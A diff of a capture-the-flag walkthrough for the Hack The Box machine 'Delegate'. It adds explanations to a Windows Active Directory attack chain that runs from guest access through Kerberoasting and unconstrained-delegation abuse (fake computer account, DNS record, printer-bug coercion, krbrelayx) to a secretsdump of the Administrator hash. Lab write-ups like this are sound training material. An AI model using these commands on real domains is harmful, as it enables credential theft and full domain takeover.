@@ -19,7 +19,7 @@ difficulties: ["Medium"]
 ## 📋 Initial Info
 - **Hostname:** `delegate.vl`
 
-Delegate is a medium-difficulty Windows machine focused heavily on Active Directory abuse and delegation attacks. The box starts off with an exposed guest account, which can be leveraged to access files containing hardcoded credentials. Those credentials provide `WriteProperty` permissions over another domain user that already has WinRM access to the Domain Controller. After compromising that account, the attack path shifts into delegation abuse since the user has the `SeEnableDelegationPrivilege` privilege assigned. With that privilege, it's possible to modify the `TRUSTED_FOR_DELEGATION` flag on AD objects and ultimately abuse Unconstrained Delegation to escalate privileges further within the domain.
+Delegate is a medium difficulty Windows machine focused heavily on Active Directory abuse and delegation attacks. The box starts off with an exposed guest account, which is leveraged to access files containing hardcoded credentials. Those credentials provide `WriteProperty` permissions over another domain user that already has WinRM access to the Domain Controller. After compromising that account, the attack path shifts into delegation abuse since the user has the `SeEnableDelegationPrivilege` privilege assigned. With that privilege, it's possible to modify the `TRUSTED_FOR_DELEGATION` flag on AD objects and ultimately abuse Unconstrained Delegation to escalate privileges further within the domain.
 
 ---
 
@@ -126,7 +126,7 @@ SMB         10.129.234.69   445    DC1              [-] Error enumerating shares
 
 `STATUS_ACCESS_DENIED`
 
-I always like to use a random name to see if  the `Guest Account` is enabled. In this case it is!
+I like to use a random name to see if  the `Guest Account` is enabled. In this case it is!
 
 ```shell
 ┌─[split@parrot:~/Documents/HTB/Delegate]
@@ -192,7 +192,7 @@ if %USERNAME%==A.Briggs net use h: \\fileserver\backups /user:Administrator P4ss
 
 Got some Credentials!
 
-I next tried these credentials and was unable to login with them. Time to find some users and do some password spraying. I know that the format is first initial, period, last name. This is useful because I could use a tool like `kerbrute` and a wordlist with this formatting of random names. However I'm going to first use a `netexec` feature to obtain valid users. It works.
+I tried these credentials and was unable to login with them. Time to find some users and do some password spraying. I know that the format is first initial, period, last name. This is useful because I can use a tool like `kerbrute` and a wordlist with this formatting of random names. However I'm going to first use a `netexec` feature to obtain valid users. It works.
 
 ```shell
 ┌─[split@parrot:~/Documents/HTB/Delegate]
@@ -231,7 +231,7 @@ SMB         10.129.234.69   445    DC1              1108: DELEGATE\N.Thompson (S
 SMB         10.129.234.69   445    DC1              1121: DELEGATE\delegation admins (SidTypeGroup)
 ```
 
-Next I'm going to compile these names into a wordlist so I can do some password spraying if I need to later. Password re-use is very common and a serious problem in most organizations. It's always worth a try. However I'm going to first see if the credentials work for `A.Briggs`
+Next I'm going to compile these names into a wordlist so I can do some password spraying if I need to later. Password reuse is very common and a serious problem in most organizations. It's always worth a try. However I'm going to first see if the credentials work for `A.Briggs`
 
 ```shell
 ┌─[split@parrot:~/Documents/HTB/Delegate]
@@ -242,13 +242,13 @@ SMB         10.129.234.69   445    DC1              [+] delegate.vl\A.Briggs:P4s
 
 Nice!
 
-Now with credentials we can further enumerate the domain. This user does not have winrm access so we are going to look for another way in.
+Now with credentials I can further enumerate the domain. This user does not have winrm access so I am going to look for another way in.
 
 ### Firing Up BloodHound
 
 ##### rusthound-ce
 
-There are many ways to collect BloodHound data. This is one of may ways to do it. I like `rusthound-ce` because it also collects certificate data.
+There are many ways to collect BloodHound data and this is one of may ways to do it. I like `rusthound-ce` because it also collects certificate data.
 
 ```shell
 ┌─[split@parrot:~/Documents/HTB/Delegate]
@@ -284,7 +284,7 @@ Now I uploaded the `.json` files onto `BloodHound`. Let's see if there is anythi
 
 ![BloodHound data showing A.Briggs with GenericWrite over N.Thompson](/images/delegate/BH_Data.png)
 
-`A.Briggs` has `GenericWrite` over the user `N.Thompson`. If we can gain access to this user we can Remote into the machine.
+`A.Briggs` has `GenericWrite` over the user `N.Thompson`. If I can gain access to this user I can Remote into the machine.
 
 **GenericWrite**
 - Write access to many object attributes (e.g., `member`, `description`, `logonHours`) but **not full control**.
@@ -348,7 +348,9 @@ For a shadow credentials attack to work, a few conditions need to be met:
 2. The Domain Controller must have its own certificate and key pair configured, which is commonly present when AD CS or another Certificate Authority is deployed.
 3. The attacker must have permissions to modify the target account's `msDS-KeyCredentialLink` attribute.
 
-### targetedKerberoast
+### TargetedKerberoast
+
+I'm going to pivot and perform a targeted Kerberoast attack instead.
 
 ```shell
 (Kerberoast) ┌─[split@parrot:~/Tools/targetedKerberoast]
@@ -401,7 +403,7 @@ Started: Mon May 25 15:16:54 2026
 Stopped: Mon May 25 15:17:10 2026
 ```
 
-It cracked very fast with a simple wordlist. Now we have some more credentials and should be able to `winrm`!
+It cracked very fast with a simple wordlist. Now I have some more credentials and should be able to `winrm`!
 
 `N.Thompson:KALEB_2341`
 
@@ -428,6 +430,8 @@ delegate\n.thompson
 
 ### Local Enumeration
 
+After landing a shell as `N.Thompson`, the first move is always to check what privileges the current user holds:
+
 ```shell
 *Evil-WinRM* PS C:\Users\N.Thompson\Documents> whoami /priv
 
@@ -441,12 +445,13 @@ SeChangeNotifyPrivilege       Bypass traverse checking                          
 SeEnableDelegationPrivilege   Enable computer and user accounts to be trusted for delegation Enabled
 SeIncreaseWorkingSetPrivilege Increase a process working set    
 ```
+The standout here is **`SeEnableDelegationPrivilege`**. This is a rare and powerful right — it lets the holder configure delegation settings on computer and user accounts in Active Directory. In practice, very few accounts should ever have this privilege, so seeing it on a regular looking user account is a strong signal that the box wants you to abuse delegation.
 
-`SeEnableDelegationPrivilege` this privilege sticks out as something dangerous.
-
-`N.Thompson` is also part of the group Delegation Admin.
+BloodHound confirms this: `N.Thompson` belongs to a group called **"Delegation Admin,"** which explains why this privilege was granted in the first place — likely a misconfigured "helper" group that was given far more power than intended.
 
 ![BloodHound showing N.Thompson's group membership and privileges](/images/delegate/N.ThompsonBHData.png)
+
+Querying AD for any existing computers trusted for delegation turns up the Domain Controller itself (`DC1`), flagged with `TRUSTED_FOR_DELEGATION`. That attribute is the fingerprint of **Unconstrained Delegation** — when a service configured this way receives a Kerberos ticket from a user, it's handed a *copy of that user's full TGT*, which it can then reuse to authenticate as that user to *any* other service. If you can get a high-privilege account (like a Domain Controller) to authenticate to a machine you control, you walk away with its TGT and effectively become that machine.
 
 ```shell
 *Evil-WinRM* PS C:\Users\N.Thompson\Documents> Get-ADComputer -Filter {TrustedForDelegation -eq $True}
@@ -467,6 +472,11 @@ UserPrincipalName :
 
 ### Unconstrained Delegation
 
+#### The Attack Chain
+
+**1. Check the Machine Account Quota (MAQ).**
+By default, any authenticated domain user can add up to 10 computer accounts to the domain. Using NetExec's `maq` module confirms this quota is available — which is what makes the next step possible without needing elevated rights.
+
 ```shell
 ┌─[split@parrot:~/Documents/HTB/Delegate]
 └─❯ nxc ldap 10.129.234.69 -u 'n.thompson' -p 'KALEB_2341' -M maq             ──(Tue,May26)─┘
@@ -476,7 +486,8 @@ MAQ         10.129.234.69   389    DC1              [*] Getting the MachineAccou
 MAQ         10.129.234.69   389    DC1              MachineAccountQuota: 10
 ```
 
-#### Create a Fake Computer
+**2. Create a fake computer account.**
+Using `impacket-addcomputer`, a new machine account (`evil$`) is registered in the domain. This gives you a computer object you fully control — including its credentials.
 
 ```shell
 ┌─[split@parrot:~/Documents/HTB/Delegate]
@@ -486,9 +497,8 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 [*] Successfully added machine account evil$ with password Password123!.
 ```
 
-#### Made it vulnerable to unconstrained delegation
-
-Two examples of this using bloodyAD or the ActiveDirectory Powershell Module
+**3. Make the fake computer "trusted for delegation."**
+Because `N.Thompson` holds `SeEnableDelegationPrivilege`, they can flip the `TRUSTED_FOR_DELEGATION` flag on the new `evil$` account (shown here two ways — via `bloodyAD` or the native `ActiveDirectory` PowerShell module). This is the core abuse of the misconfigured privilege: a normal user is turning their own rogue machine into a valid unconstrained-delegation target.
 
 bloodyAD
 ```shell
@@ -515,7 +525,8 @@ TrustedForDelegation : True
 UserPrincipalName    :
 ```
 
-Created a Fake DNS record
+**4. Create a DNS record and SPN for the fake host.**
+`dnstool.py` registers a DNS A record pointing `evil.delegate.vl` at the attacker's IP, and `addspn.py` assigns it a `cifs/` Service Principal Name on the `evil$` computer object. Together, these make `evil.delegate.vl` look like a legitimate, addressable service in the domain — necessary for the DC to be coaxed into authenticating to it.
 ```shell
 ┌─[split@parrot:~/Tools/krbrelayx]
 └─❯ python3 dnstool.py -u 'delegate.vl\N.Thompson' -p KALEB_2341 -r evil.delegate.vl -a add -t A -d 10.10.14.239 -dns-ip 10.129.234.69 DC1.delegate.vl                        ──(Tue,May26)─┘
@@ -547,7 +558,12 @@ Craft SPN on the Target Computer
 [+] SPN Modified successfully
 ```
 
-Exploit
+**5. Coerce authentication from the DC.**
+This is the classic one-two punch:
+   - **`krbrelayx.py`** is stood up as a listener, ready to capture incoming Kerberos tickets.
+   - **`printerbug.py`** abuses the MS-RPRN (Print Spooler) protocol to force the Domain Controller to authenticate back to the attacker-controlled `evil.delegate.vl`.
+
+Because `evil$` is trusted for unconstrained delegation, when DC1 authenticates to it, it hands over a full copy of its own TGT (`DC1$@DELEGATE.VL`). `krbrelayx` captures this ticket.
 
 ```shell
 ┌─[split@parrot:~/Tools/krbrelayx]
@@ -561,7 +577,8 @@ Exploit
 
 ![krbrelayx capturing the DC's TGT via the printer bug](/images/delegate/Exploit.png)
 
-SecretsDump
+**6. Use the captured TGT to dump domain secrets.**
+With the Domain Controller's own TGT in hand (loaded via `KRB5CCNAME`), `impacket-secretsdump` performs a DCSync-style extraction of the Administrator's NTLM hash directly from NTDS.DIT.
 
 ```shell
 ┌─[split@parrot:~/Tools/krbrelayx]
@@ -575,6 +592,9 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:c32198ceab4cc695e65045562aa3ee93:::
 [*] Cleaning up...
 ```
+
+**7. Profit.**
+That hash is used to `evil-winrm` straight in as `delegate\administrator` — full domain compromise.
 
 ```shell
 ┌─[split@parrot:~/Documents/HTB/Delegate]
